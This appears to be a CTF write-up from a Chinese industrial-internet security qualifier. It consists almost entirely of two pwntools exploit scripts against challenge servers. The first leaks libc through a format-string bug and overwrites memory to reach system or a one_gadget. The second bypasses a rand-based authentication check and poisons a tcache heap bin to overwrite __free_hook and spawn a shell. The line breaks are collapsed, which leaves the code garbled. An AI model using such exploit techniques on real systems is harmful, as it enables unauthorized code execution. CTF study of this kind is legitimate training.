# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/中国工业互联网安全大赛北京市预选赛-Polaris战队_WP.md
# TITLE: 中国工业互联网安全大赛北京市预选赛-Polaris战队 WP
# CATEGORY: pwn

from pwn import *# r = process('./pwn1')r = remote("39.105.99.40",16018)e = ELF('./pwn1')libc = e.libccontext.terminal = ['tmux', 'splitw', '-h']context.log_level = 'debug'
se = lambda data :r.send(data) sa = lambda delim,data :r.sendafter(delim, data)sl = lambda data :r.sendline(data)sla = lambda delim,data :r.sendlineafter(delim, data)sea = lambda delim,data :r.sendafter(delim, data)rc = lambda numb=4096 :r.recv(numb)rl = lambda :r.recvline()ru = lambda delims :r.recvuntil(delims)uu32 = lambda data :
u32(ru(data)[-4:].ljust(4, b''))uu64 = lambda data :
u64(ru(data)[-6:].ljust(8, b''))info_base = lambda tag, base :r.info(tag + ': {:#x}'.format(base))leak = lambda name,base :
log.success('{} = {:#x}'.format(name, base))
def dbg(cmd): gdb.attach(r,cmd)
ru(b'HELLO?PWN IT!!!n')sl(b"%9$p")
got = 0x403390
og = [0x45226,0x4527a,0xf03a4,0xf1247]libc_base = int(rc(14),16)-0x20840leak("libc_base",libc_base)sys = libc_base + libc.sym['system']offest1 = sys & 0xffff offest3 = sys & 0xffffffoffest2 = int(offest3/0x10000)shell = libc_base + og[0]pl1 = '%13200c%6$hn%4194306c%17$n' sl(pl1.encode())
leak('sys',sys)leak("shell",shell)#36 8ru(b'HELLO?PWN IT!!!n')pl2 = "%" + "{}c".format(offest2) + "%36$hhn"pl2 += "%" + "{}c".format(offest1-offest2) + "%8$hn"sl(pl2.encode())
# dbg('')
r.interactive()#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *import os, struct, random, time, sys, signal, ctypes
dll = ctypes.CDLL('libc.so.6')dll.srand(dll.time())
class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./pwn']) self.pipe = remote('47.95.8.59', 29767) def send(self, data:
bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
 def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
 def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
 def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
 def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params)
 def add(self, index, size, content): self.send(b'POST / HTTP/1.1rn' + p8(1) + b'&' + str(index).encode() + b'&' + str(size).encode() + b'&' + content) def delete(self, index): self.send(b'POST / HTTP/1.1rn' + p8(4) + b'&' + str(index).encode())
 def show(self, index): self.send(b'POST / HTTP/1.1rn' + p8(3) + b'&' + str(index).encode())
 def edit(self, index, content): self.send(b'POST / HTTP/1.1rn' + p8(2) + b'&' + str(index).encode() + b'&' + content)

sh = Shell()sh.send(b'DEV / HTTP/1.1rn' + p32(dll.rand()) + b'auth')time.sleep(1)sh.add(0, 0x26, b'a')time.sleep(1)sh.show(0)sh.recvuntil(b'The Humide Script 0 is set as ')libc_addr = u64(sh.recvn(6) + b'') - 0x1ecb61success('libc_addr: ' + hex(libc_addr))time.sleep(1)sh.add(1, 0x18, b'a')time.sleep(1)sh.add(2, 0x18, b'a')time.sleep(1)sh.add(0x10, 0x18, b'a')time.sleep(1)sh.delete(2)time.sleep(1)sh.delete(1)time.sleep(1)sh.edit(0, b'a' * 0x20 + p64(libc_addr + 0x1eee48))time.sleep(1)sh.add(2, 0x18, b'/bin/sh')time.sleep(1)sh.add(3, 0x18, p64(libc_addr + 0x52290))time.sleep(1)sh.delete(2)sh.interactive()
